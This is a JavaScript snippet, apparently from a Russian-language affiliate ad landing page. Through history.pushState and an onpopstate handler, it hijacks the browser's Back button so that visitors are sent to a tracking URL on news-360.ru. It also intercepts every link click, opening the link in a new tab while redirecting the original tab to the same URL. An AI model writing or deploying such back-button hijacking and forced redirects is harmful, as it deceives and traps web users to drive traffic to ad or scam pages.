var genericTitle = "<p>Подождите!</p>";
var closeLink = "https://news-360.ru/index.php/?hash=cec4db51-df04-4d0f-9675-aec6e518d881&landRedirectDelay=1000";
var userLink = "https://news-360.ru/index.php/?hash=cec4db51-df04-4d0f-9675-aec6e518d881&landRedirectDelay=1000";
var backLink = "https://news-360.ru/index.php/?hash=cec4db51-df04-4d0f-9675-aec6e518d881&landRedirectDelay=1000";
var popupBtnText = "";
var popupBtnLink = $.leadproLandUrl ? $.leadproLandUrl() : "";
var imgPath = "https://lucky.online";
var indent1 = "<p></p>";
var indent2 = "<p></p>";

if (!window.jQuery) {
    var script = document.createElement('script');
    script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js';
    document.getElementsByTagName('head')[0].appendChild(script);
}

var popupLoad = setInterval(popupLoading, 500);

function popupLoading() {
    if (!window.jQuery) {
        return false;
    }
    clearInterval(popupLoad);

    var utm_params = {};

    var utm_medium = findGetParameter('utm_medium');


    if (utm_medium != null) {
        utm_params.utm_medium = utm_medium;
    }

    for (var key in utm_params) {
        closeLink = closeLink + '&' + key + '=' + utm_params[key];
        userLink = userLink + '&' + key + '=' + utm_params[key];
        backLink = backLink + '&' + key + '=' + utm_params[key];
    }

    var landRedirectDelay = 1000;

if($.leadproLandUrl){
    $('a[href="#order"]').attr('target', '_blank').off('click').attr('href', $.leadproLandUrl());
}
$(document).ready(function(){$(document).on("click","a", function(){
	if($(this).attr("href") !== null && $(this).attr("href")[0] !== undefined && $(this).attr("href")[0] == '#'){
		return false;
	}
	window.history.pushState({page:1},"",window.location),window.onpopstate=function(o){location.replace(backLink)}
	if(null!=$(this).attr("href"))return window.open($(this).attr("href")),setTimeout(function(){window.location.href=userLink}, landRedirectDelay),!1;window.location.href=userLink})});
//$(document).ready(function(){window.history.pushState({page:1},"",window.location),window.onpopstate=function(o){location.replace(backLink)}});

    $(document).ready(function () {
        $(window).scroll(function () {
            $('img[realsrc]').each(function (i) {
                var t = $(this);
                if (t.offset().top < ($(window).scrollTop() + $(window).height())) {
                    t.attr('src', t.attr('realsrc')); // trigger the image load
                    t.removeAttr('realsrc'); // so we only process this image once
                }
            });
        }).trigger('scroll');
    });

}

function findGetParameter(parameterName) {
    var result = null,
    tmp = [];
    var items = location.search.substr(1).split("&");
    for (var index = 0; index < items.length; index++) {
        tmp = items[index].split("=");
        if (tmp[0] === parameterName) result = tmp[1];
    }
    return result;
}
